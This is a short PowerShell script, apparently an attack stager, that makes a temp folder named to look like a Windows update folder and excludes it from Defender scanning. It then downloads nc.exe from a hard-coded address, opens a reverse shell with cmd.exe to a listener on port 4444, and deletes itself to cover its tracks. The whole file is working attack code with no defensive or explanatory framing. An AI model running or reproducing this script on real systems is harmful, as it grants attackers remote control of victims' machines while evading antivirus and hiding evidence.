# Define temporary folder and executable name
$TempDir = "$env:TEMP\WinUpdateTemp"
$NcPath = "$TempDir\nc.exe"

# Create the temp folder
New-Item -ItemType Directory -Force -Path $TempDir | Out-Null

# Exclude the folder from Defender
Add-MpPreference -ExclusionPath $TempDir

# Download nc.exe from the server
Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath

# Run nc.exe to connect to listener
Start-Process -FilePath $NcPath -ArgumentList "192.168.0.115 4444 -e cmd.exe"

# Delete the script after a short delay                                                                   
Start-Sleep -Seconds 5                                                                                    
$MyPath = $MyInvocation.MyCommand.Definition                                                              
Start-Sleep -Milliseconds 500                                                                             
Remove-Item -Path $MyPath -Force
